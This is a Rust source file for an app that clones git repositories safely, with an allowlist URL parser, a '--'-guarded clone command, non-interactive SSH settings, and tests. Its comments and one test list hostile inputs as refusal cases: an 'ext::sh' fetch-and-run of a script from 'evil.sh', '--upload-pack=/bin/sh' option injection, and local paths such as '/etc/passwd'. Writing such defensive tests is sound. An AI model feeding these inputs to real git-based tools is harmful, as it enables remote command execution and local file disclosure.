//! Cloning a repository with the git the user already has.
//!
//! Deliberately the smallest possible surface. This app does **not** manage
//! keys, agents, `known_hosts`, tokens or host trust — the person running it
//! has a working `git` and a working `ssh`, and everything this needs is
//! already in their `~/.ssh/config`. Reproducing any of it here would mean a
//! second, worse copy of a setup that is already correct.
//!
//! So the whole contribution is three things: check that `git` exists, check
//! that the URL is a URL, and run `git clone` in a way that cannot stop and ask
//! a question nobody is there to answer.
//!
//! ## The URL is the security boundary
//!
//! Everywhere else in this app, the front end sends a handle and the Rust side
//! builds the argv — see [`crate::quickcmd`], where that rule is the security
//! model. A repository URL cannot work that way: it is free text by nature, and
//! it is the first webview-supplied string in this codebase to reach a
//! subprocess argument.
//!
//! Three concrete attacks make that matter, and they are why [`parse`] is an
//! allowlist rather than a filter:
//!
//! * `ext::sh -c "…"` — git's `ext` transport runs the rest as a command. A
//!   clone box that accepted it would be a remote shell.
//! * `--upload-pack=…` — a value beginning with `-` is read by git as an
//!   option, and that one names a program to execute. `--` before the URL
//!   stops it, and this rejects it anyway; two answers to one question is how
//!   one of them gets removed later by somebody who found the other.
//! * `file://` and bare local paths — not a network fetch at all, and a way to
//!   copy a directory the webview named into the workspace.
//!
//! Only two forms are accepted, and no host is special. The three big forges
//! are not named anywhere here on purpose: a self-hosted GitLab on a company
//! domain is the case this was asked for.

use crate::error::{Code, Error, Result};

/// A repository URL that has been checked, and what to call the clone.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Repo {
    /// Exactly the text the user gave, once it is known to be one of the two
    /// accepted shapes. Never rewritten — a URL git understands and we
    /// "normalised" is a URL that stopped working for somebody's `insteadOf`
    /// rule or their `~/.ssh/config` host alias.
    pub url: String,
    /// The last path segment without `.git`, which is what git itself would
    /// name the directory.
    pub name: String,
}

/// Is git on this machine?
///
/// Reused from [`crate::apps`], which also looks past `PATH` on macOS — worth
/// knowing, because an app launched from the Dock inherits launchd's `PATH`
/// and not a login shell's. Apple's git at `/usr/bin/git` is on both; a
/// Homebrew git at `/opt/homebrew/bin` is on neither, and a check that only
/// read `PATH` would report "git is not installed" to somebody who has it.
pub fn available() -> bool {
    crate::apps::is_available("git")
        || [
            "/usr/bin/git",
            "/usr/local/bin/git",
            "/opt/homebrew/bin/git",
        ]
        .iter()
        .any(|p| std::path::Path::new(p).is_file())
}

/// The name git itself would give the clone directory.
fn dir_name(path: &str) -> Option<String> {
    let last = path
        .trim_end_matches('/')
        .rsplit('/')
        .next()
        .unwrap_or("")
        .trim_end_matches(".git");

    // Anything that would not survive `project_dir`'s name check is rejected
    // here instead, so the message names the URL rather than a path.
    let ok = !last.is_empty()
        && last
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
        && last
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphanumeric());

    ok.then(|| crate::workspace::canonical_name(last))
}

/// Accept a repository URL, or say why not.
///
/// Two shapes, and nothing else:
///
/// * `ssh://[user@]host[:port]/path` — also `https://` and `http://`, because a
///   public repository over HTTPS needs no credentials and refusing it would be
///   arbitrary.
/// * `user@host:path` — scp syntax, which is what every forge's copy button
///   produces and what `git@gitlab.example.com:group/sub/repo.git` is.
pub fn parse(raw: &str) -> Result<Repo> {
    let url = raw.trim();

    let reject = |why: &str, hint: &str| {
        Err(Error::new(Code::InvalidInput, why.to_string()).with_hint(hint.to_string()))
    };

    if url.is_empty() {
        return reject("No repository URL.", "Paste the SSH or HTTPS clone URL.");
    }
    // A URL is one argument. Whitespace inside one means the text is not a URL,
    // and it is also how `ext::sh -c "…"` carries its payload.
    if url.chars().any(char::is_whitespace) {
        return reject(
            "A repository URL cannot contain spaces.",
            "Paste only the URL, with no extra arguments.",
        );
    }
    if url.starts_with('-') {
        return reject(
            "That is an option, not a repository.",
            "A URL beginning with `-` would be read by git as a flag.",
        );
    }

    let path = if let Some(rest) = url
        .strip_prefix("ssh://")
        .or_else(|| url.strip_prefix("https://"))
        .or_else(|| url.strip_prefix("http://"))
    {
        // `[user@]host[:port]/path` — the authority ends at the first slash.
        let (authority, path) = rest.split_once('/').unwrap_or((rest, ""));
        if authority.is_empty() {
            return reject("That URL names no host.", "Expected ssh://host/path.");
        }
        path
    } else if let Some((authority, path)) = url.split_once(':') {
        // scp syntax. A scheme this does not accept — `ext::`, `file:`, `git:` —
        // also splits here, so the authority is checked for the `user@host`
        // shape rather than the scheme being blocklisted. A list of bad schemes
        // is a list somebody has to keep complete.
        if !authority.contains('@') || authority.starts_with('@') || authority.ends_with('@') {
            return reject(
                "Unsupported URL.",
                "Use ssh://host/path, https://host/path, or user@host:path.",
            );
        }
        path
    } else {
        return reject(
            "That is not a repository URL.",
            "Use ssh://host/path, https://host/path, or user@host:path.",
        );
    };

    let Some(name) = dir_name(path) else {
        return reject(
            "The repository name in that URL cannot be a folder name.",
            "Letters, digits, dot, underscore and dash only.",
        );
    };

    Ok(Repo {
        url: url.to_string(),
        name,
    })
}

/// The argv for the clone. `--` is what keeps a URL from ever being an option.
pub fn clone_args(repo: &Repo, into: &std::path::Path) -> Vec<String> {
    vec![
        "clone".into(),
        // Git prints progress only to a TTY unless asked; without this a clone
        // of a large repository reports nothing at all until it finishes. It
        // still arrives carriage-return-delimited — the runner's reader treats
        // a `\r` as ending a line for exactly this reason, which was measured
        // against a real clone rather than assumed.
        "--progress".into(),
        "--".into(),
        repo.url.clone(),
        into.display().to_string(),
    ]
}

/// The environment that makes a clone fail instead of hang.
///
/// Nothing here configures authentication — that is the user's `ssh` doing its
/// own job with their own config. These two only remove the one behaviour a
/// windowless subprocess cannot survive: waiting for an answer.
///
/// `StrictHostKeyChecking` is deliberately **not** set. Turning it off would
/// make an unknown host silently trusted, which is the one failure worth
/// stopping for; with `BatchMode` it fails immediately and says so, and the
/// user fixes it by connecting once from their own terminal.
pub const CLONE_ENV: [(&str, &str); 2] = [
    // No credential prompt for HTTPS.
    ("GIT_TERMINAL_PROMPT", "0"),
    // No passphrase or password prompt for SSH, and a bounded connect.
    (
        "GIT_SSH_COMMAND",
        "ssh -o BatchMode=yes -o ConnectTimeout=15",
    ),
];

/// Whether git would ignore this path, as far as git itself is concerned.
///
/// B-2 rests entirely on `stackvo.local.json` not being committed — that is the
/// whole difference between "my machine's settings" and "the team's settings",
/// and it is not something this app can enforce, because the ignore rules are
/// the user's file in the user's repository. What it can do is *measure* it and
/// say so, which is the same posture as everywhere else here: the person has a
/// working git, and this asks it a question rather than reproducing its rules.
///
/// Three answers, not two. `None` means git could not answer — no git, not a
/// repository, or a command that failed — and that is genuinely different from
/// "not ignored": a project directory that is not under version control has
/// nothing to leak into anybody's clone, so warning about it would be noise.
///
/// `git check-ignore` exits 0 when the path *is* ignored and 1 when it is not,
/// which is why the exit code is read rather than the output. `--no-index` so
/// the answer is about the ignore rules and not about a file that happens to be
/// tracked already — a file that was committed once is not ignored, and that is
/// exactly the case worth reporting.
pub fn is_ignored(path: &std::path::Path) -> Option<bool> {
    if !available() {
        return None;
    }
    let dir = path.parent()?;

    let output = std::process::Command::new("git")
        .arg("-C")
        .arg(dir)
        .arg("check-ignore")
        .arg("--no-index")
        .arg("--quiet")
        .arg("--")
        .arg(path)
        .output()
        .ok()?;

    match output.status.code() {
        Some(0) => Some(true),
        Some(1) => Some(false),
        // 128 is git's "fatal" — not a repository, most often. Anything else is
        // a git this code does not understand, and guessing would be worse than
        // saying nothing.
        _ => None,
    }
}

/// What a project directory is, as far as git is concerned.
///
/// `None` from [`checkout`] means "not a repository"; a `Checkout` with no
/// `remote` means "a repository somebody ran `git init` in". Those are two
/// different answers and the table says so — a project with local history and
/// no upstream is not the same as a directory that was never versioned.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Checkout {
    /// The `origin` remote, verbatim.
    ///
    /// Read out of `.git/config` rather than by running `git remote get-url`.
    /// This is called once per project on every list, and spawning a
    /// subprocess per row turns a directory listing into twenty forks — on a
    /// page that reloads whenever a container changes state.
    pub remote: Option<String>,
}

/// Is this a repository, and where did it come from?
///
/// Filesystem only, so it costs a stat and at most one small file read, and it
/// answers on a machine with no git installed — which is the right behaviour:
/// the `.git` directory is what makes it a checkout, not the presence of the
/// tool that made it.
pub fn checkout(dir: &std::path::Path) -> Option<Checkout> {
    let dot = dir.join(".git");
    if !dot.exists() {
        return None;
    }

    Some(Checkout {
        remote: config_dir(&dot).and_then(|d| origin_in(&d.join("config"))),
    })
}

/// Where the `config` of this checkout lives.
///
/// For an ordinary clone that is `.git` itself. For a **worktree** `.git` is a
/// file reading `gitdir: /path/to/main/.git/worktrees/<name>`, and the config
/// belongs to the main repository — the worktree's own gitdir holds a
/// `commondir` pointing back at it. Worth following rather than giving up on:
/// this app creates worktrees itself, so they are not an exotic case here, and
/// reporting "no remote" for every one of them would be reporting a difference
/// that does not exist.
fn config_dir(dot: &std::path::Path) -> Option<std::path::PathBuf> {
    if dot.is_dir() {
        return Some(dot.to_path_buf());
    }

    let pointer = std::fs::read_to_string(dot).ok()?;
    let gitdir = std::path::PathBuf::from(pointer.trim().strip_prefix("gitdir:")?.trim());

    // `commondir` is relative to the gitdir when it is relative at all.
    match std::fs::read_to_string(gitdir.join("commondir")) {
        Ok(common) => {
            let common = std::path::Path::new(common.trim());
            Some(if common.is_absolute() {
                common.to_path_buf()
            } else {
                gitdir.join(common)
            })
        }
        // A `gitdir:` file that is not a worktree — a submodule, say. Its own
        // directory is then the config's.
        Err(_) => Some(gitdir),
    }
}

/// The `url` of the `origin` remote in a git config file.
///
/// Hand-scanned rather than parsed as INI, because git's config is not INI —
/// it has subsection names in quotes, and a general parser would be a
/// dependency and a set of edge cases in exchange for one field.
fn origin_in(config: &std::path::Path) -> Option<String> {
    let text = std::fs::read_to_string(config).ok()?;
    let mut in_origin = false;

    for line in text.lines() {
        let line = line.trim();
        if line.starts_with('[') {
            // Both spellings git writes: `[remote "origin"]` from a clone, and
            // the section-header form some tools produce.
            in_origin = line.replace(char::is_whitespace, "") == "[remote\"origin\"]";
            continue;
        }
        if !in_origin {
            continue;
        }
        if let Some(value) = line.strip_prefix("url") {
            let value = value.trim_start();
            if let Some(value) = value.strip_prefix('=') {
                return Some(value.trim().to_string()).filter(|v| !v.is_empty());
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A scratch directory of our own, removed first so a failed run does not
    /// poison the next one.
    fn scratch(name: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("stackvo-git-{name}"));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// Three answers, not two: never versioned, versioned with no upstream, and
    /// cloned from somewhere. The middle one is the one a boolean would lose.
    #[test]
    fn a_repository_without_a_remote_is_still_a_repository() {
        let dir = scratch("plain");

        assert_eq!(checkout(&dir), None, "a bare directory is not a checkout");

        std::fs::create_dir_all(dir.join(".git")).unwrap();
        std::fs::write(
            dir.join(".git/config"),
            "[core]\n\trepositoryformatversion = 0\n",
        )
        .unwrap();
        assert_eq!(checkout(&dir), Some(Checkout { remote: None }));

        std::fs::write(
            dir.join(".git/config"),
            "[core]\n\tbare = false\n[remote \"origin\"]\n\turl = git@example.com:a/b.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n",
        )
        .unwrap();
        assert_eq!(
            checkout(&dir).unwrap().remote.as_deref(),
            Some("git@example.com:a/b.git")
        );
    }

    /// Not `origin`, and not a key that merely starts with `url`.
    #[test]
    fn only_the_origin_remotes_url_counts() {
        let dir = scratch("remotes");
        std::fs::create_dir_all(dir.join(".git")).unwrap();
        std::fs::write(
            dir.join(".git/config"),
            "[remote \"upstream\"]\n\turl = git@example.com:upstream/b.git\n\
             [remote \"origin\"]\n\turlsomething = no\n\turl = git@example.com:mine/b.git\n",
        )
        .unwrap();

        assert_eq!(
            checkout(&dir).unwrap().remote.as_deref(),
            Some("git@example.com:mine/b.git"),
            "the first url in the file won rather than origin's"
        );
    }

    /// A worktree's `.git` is a *file*, and its config belongs to the main
    /// repository. This app creates worktrees itself, so reporting "no remote"
    /// for every one of them would be inventing a difference.
    #[test]
    fn a_worktree_reports_the_repository_it_belongs_to() {
        let root = scratch("worktree");
        let main = root.join("main");
        let wt = root.join("feature");
        std::fs::create_dir_all(main.join(".git/worktrees/feature")).unwrap();
        std::fs::create_dir_all(&wt).unwrap();
        std::fs::write(
            main.join(".git/config"),
            "[remote \"origin\"]\n\turl = https://example.com/a/b.git\n",
        )
        .unwrap();
        // What git actually writes into both files.
        std::fs::write(main.join(".git/worktrees/feature/commondir"), "../..\n").unwrap();
        std::fs::write(
            wt.join(".git"),
            format!(
                "gitdir: {}\n",
                main.join(".git/worktrees/feature").display()
            ),
        )
        .unwrap();

        assert_eq!(
            checkout(&wt).unwrap().remote.as_deref(),
            Some("https://example.com/a/b.git")
        );
    }

    /// Nothing here runs git, so the answer must not depend on it being
    /// installed — and a checkout copied onto a machine without git is still a
    /// checkout.
    #[test]
    fn a_malformed_config_says_no_remote_rather_than_no_repository() {
        let dir = scratch("garbage");
        std::fs::create_dir_all(dir.join(".git")).unwrap();
        std::fs::write(
            dir.join(".git/config"),
            "\u{0}not\nan\nini\n[remote \"origin\"\n",
        )
        .unwrap();

        assert_eq!(checkout(&dir), Some(Checkout { remote: None }));
    }

    #[test]
    fn the_scp_form_every_forge_copy_button_produces() {
        // The URL this was asked for: a self-hosted host and a nested group.
        let repo = parse("git@gitlab.bitem.tr:ajans/parser/ajans-parser.git").unwrap();
        assert_eq!(repo.name, "ajans-parser");
        assert_eq!(
            repo.url,
            "git@gitlab.bitem.tr:ajans/parser/ajans-parser.git"
        );
    }

    #[test]
    fn the_url_forms_and_the_names_they_yield() {
        for (raw, name) in [
            ("ssh://git@example.com/group/repo.git", "repo"),
            ("ssh://git@example.com:2222/group/repo.git", "repo"),
            ("https://example.com/group/repo.git", "repo"),
            ("https://example.com/group/repo", "repo"),
            ("git@example.com:repo.git", "repo"),
            // Docker image references reject capitals, so names are lowered —
            // the same rule `project_create` applies.
            ("git@example.com:group/MyRepo.git", "myrepo"),
            ("https://example.com/group/repo.git/", "repo"),
        ] {
            assert_eq!(parse(raw).unwrap().name, name, "{raw}");
        }
    }

    /// The three attacks the allowlist exists for. Each one is a way to turn a
    /// text field into command execution or local file access.
    #[test]
    fn the_forms_that_would_run_something_are_refused() {
        for raw in [
            // git's ext transport executes the rest.
            "ext::sh -c 'curl evil.sh | sh'",
            "ext::sh",
            // Read by git as an option, and this one names a program.
            "--upload-pack=/bin/sh",
            "-u/bin/sh",
            // Not a network fetch; a way to name a local directory.
            "file:///etc",
            "/etc/passwd",
            "../../etc",
            // Nothing that could be a host.
            "not a url",
            "",
            "   ",
            "https://",
            "@example.com:repo.git",
            "git@:repo.git",
        ] {
            assert!(parse(raw).is_err(), "{raw:?} was accepted");
        }
    }

    /// A URL is never rewritten. Someone's `insteadOf` rule or a `Host` alias
    /// in `~/.ssh/config` only works on the text they typed.
    #[test]
    fn the_url_reaches_git_exactly_as_it_was_given() {
        let raw = "myalias:group/repo.git";
        // An alias with no `user@` is not one of the two accepted shapes, so
        // this documents the cost of the rule rather than pretending there is
        // none.
        assert!(parse(raw).is_err());

        let repo = parse("  git@example.com:group/repo.git  ").unwrap();
        assert_eq!(repo.url, "git@example.com:group/repo.git", "only trimmed");
    }

    #[test]
    fn the_argv_puts_the_url_behind_a_double_dash() {
        let repo = parse("git@example.com:group/repo.git").unwrap();
        let args = clone_args(&repo, std::path::Path::new("/tmp/x"));
        let dashes = args.iter().position(|a| a == "--").expect("no `--`");
        let url = args
            .iter()
            .position(|a| a == "git@example.com:group/repo.git")
            .expect("no url");
        assert!(
            dashes < url,
            "the URL is not protected from being an option"
        );
        assert_eq!(args[0], "clone");
        assert!(!args.iter().any(|a| a.contains(' ') && a.contains("-o ")));
    }

    /// Both variables are load-bearing: either one missing is a subprocess that
    /// waits for a human forever, in a window with no terminal.
    #[test]
    fn nothing_in_the_clone_environment_can_ask_a_question() {
        let env: std::collections::HashMap<_, _> = CLONE_ENV.into_iter().collect();
        assert_eq!(env.get("GIT_TERMINAL_PROMPT"), Some(&"0"));
        assert!(env["GIT_SSH_COMMAND"].contains("BatchMode=yes"));
        assert!(env["GIT_SSH_COMMAND"].contains("ConnectTimeout="));
        // Silently trusting an unknown host is the one thing worth stopping for.
        assert!(
            !env["GIT_SSH_COMMAND"].contains("StrictHostKeyChecking=no"),
            "host key checking must not be disabled"
        );
    }

    /// Detection must not depend on `PATH` alone: an app launched from the Dock
    /// inherits launchd's, not a login shell's.
    #[test]
    fn git_detection_looks_past_the_path() {
        // Whether git is installed here is not the assertion — that it agrees
        // with the filesystem when `PATH` is empty is.
        if std::path::Path::new("/usr/bin/git").is_file() {
            assert!(available(), "git is at /usr/bin/git but was not found");
        }
    }
}
